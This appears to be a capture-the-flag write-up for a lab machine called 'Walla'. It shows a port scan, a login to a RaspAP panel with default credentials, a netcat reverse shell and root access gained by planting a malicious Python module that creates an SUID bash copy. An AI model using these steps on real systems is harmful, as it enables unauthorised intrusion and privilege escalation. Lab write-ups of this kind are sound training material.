# Walla

# Enumeration

```bash
┌──(kali㉿kali)-[~]
└─$ rustscan -a 192.168.71.97 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.71.97:22
Open 192.168.71.97:23
Open 192.168.71.97:25
Open 192.168.71.97:53
Open 192.168.71.97:422
Open 192.168.71.97:8091
Open 192.168.71.97:42042
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 11:49 EST
Initiating Ping Scan at 11:49
Scanning 192.168.71.97 [2 ports]
Completed Ping Scan at 11:49, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:49
Completed Parallel DNS resolution of 1 host. at 11:49, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:49
Scanning 192.168.71.97 [7 ports]
Discovered open port 25/tcp on 192.168.71.97
Discovered open port 23/tcp on 192.168.71.97
Discovered open port 22/tcp on 192.168.71.97
Discovered open port 53/tcp on 192.168.71.97
Discovered open port 8091/tcp on 192.168.71.97
Discovered open port 422/tcp on 192.168.71.97
Discovered open port 42042/tcp on 192.168.71.97
Completed Connect Scan at 11:49, 0.17s elapsed (7 total ports)
Nmap scan report for 192.168.71.97
Host is up, received conn-refused (0.17s latency).
Scanned at 2022-02-27 11:49:38 EST for 1s

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
23/tcp    open  telnet  syn-ack
25/tcp    open  smtp    syn-ack
53/tcp    open  domain  syn-ack
422/tcp   open  ariel3  syn-ack
8091/tcp  open  jamlink syn-ack
42042/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

# Exploitation

## 8091 - Web

Login with `admin:secret` https://www.google.com/search?q=RaspAP+credentials&sxsrf=APq-WBtHgQf2PoDb7XSLFzCoJw77cOISgA%3A1645980628720&ei=1KsbYv6lK7GYseMPgoubwAs&ved=0ahUKEwj-37nVq6D2AhUxTGwGHYLFBrgQ4dUDCA4&uact=5&oq=RaspAP+credentials&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIGCAAQFhAeOgcIABBHELADOgcIABCwAxBDOgoIABCABBCHAhAUOgUIABCABEoECEEYAEoECEYYAFDZAljODmDsD2gBcAF4AIABqwGIAZ4GkgEEMTEuMZgBAKABAcgBCsABAQ&sclient=gws-wiz-serp

![](Pasted%20image%2020220228005112.png)

![](Pasted%20image%2020220228005321.png)

## Reverse Shell
![](Pasted%20image%2020220228005805.png)

`3f2a9d6969a3f1338e18cc09fd952166`

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 8091                                                                                                                                                   1 ⨯
listening on [any] 8091 ...
connect to [192.168.49.71] from (UNKNOWN) [192.168.71.97] 47750
www-data@walla:/var/www/html/includes$ cd /home/   
cd /home/
www-data@walla:/home$ ls
ls
janis  paige  terry  walter
www-data@walla:/home$ cd walter
cd walter
www-data@walla:/home/walter$ ls
ls
local.txt  wifi_reset.py
www-data@walla:/home/walter$ cat local.txt
cat local.txt
3f2a9d6969a3f1338e18cc09fd952166
www-data@walla:/home/walter$ ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.71.97  netmask 255.255.255.0  broadcast 192.168.71.255
        ether 00:50:56:ba:b8:43  txqueuelen 1000  (Ethernet)
        RX packets 124236  bytes 8547782 (8.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 121899  bytes 7825771 (7.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 769  bytes 53694 (52.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 769  bytes 53694 (52.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

www-data@walla:/home/walter$ 

```

![](Pasted%20image%2020220228005934.png)

# Privesc - Python Library Injection

```bash
www-data@walla:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on walla:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
www-data@walla:/tmp$ cat /home/walter/wifi_reset.py
cat /home/walter/wifi_reset.py
#!/usr/bin/python

import sys

try:
        import wificontroller
except Exception:
        print "[!] ERROR: Unable to load wificontroller module."
        sys.exit()

wificontroller.stop("wlan0", "1")
wificontroller.reset("wlan0", "1")
wificotroller.start("wlan0", "1")
www-data@walla:/tmp$ ls -al /home/walter/wifi_reset.py
ls -al /home/walter/wifi_reset.py
-rw-r--r-- 1 root root 251 Sep 17  2020 /home/walter/wifi_reset.py
www-data@walla:/tmp$ ls -al /home/walter
ls -al /home/walter
total 28
drwxr-xr-x 2 www-data www-data 4096 Sep 17  2020 .
drwxr-xr-x 6 root     root     4096 Sep 17  2020 ..
-rw-r--r-- 1 walter   walter    220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 walter   walter   3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 walter   walter    807 Apr 18  2019 .profile
-rw------- 1 www-data walter     33 Feb 27 11:45 local.txt
-rw-r--r-- 1 root     root      251 Sep 17  2020 wifi_reset.py
www-data@walla:/tmp$ cd /home/walter
cd /home/walter
www-data@walla:/home/walter$ ls /bash
ls /bash
ls: cannot access '/bash': No such file or directory
www-data@walla:/home/walter$ echo "import os; os.system('cp /bin/bash /bash && chmod u+s /bash')" > wificontroller.py
<ash /bash && chmod u+s /bash')" > wificontroller.py
www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
sudo /usr/bin/python /home/walter/wifi_reset.py
Traceback (most recent call last):
  File "/home/walter/wifi_reset.py", line 11, in <module>
    wificontroller.stop("wlan0", "1")
AttributeError: 'module' object has no attribute 'stop'
www-data@walla:/home/walter$ ls /bash
ls /bash
/bash
www-data@walla:/home/walter$ /bash -p
/bash -p
bash-5.0# cd /root
cd /root
bash-5.0# ls
ls
proof.txt
bash-5.0# cat proof.txt
cat proof.txt
013ca8bca859d03c0261be3601679238
bash-5.0# ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.71.97  netmask 255.255.255.0  broadcast 192.168.71.255
        ether 00:50:56:ba:b8:43  txqueuelen 1000  (Ethernet)
        RX packets 150736  bytes 11020036 (10.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 147266  bytes 11605820 (11.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 787  bytes 54990 (53.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 787  bytes 54990 (53.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bash-5.0# 
```

![](Pasted%20image%2020220228010432.png)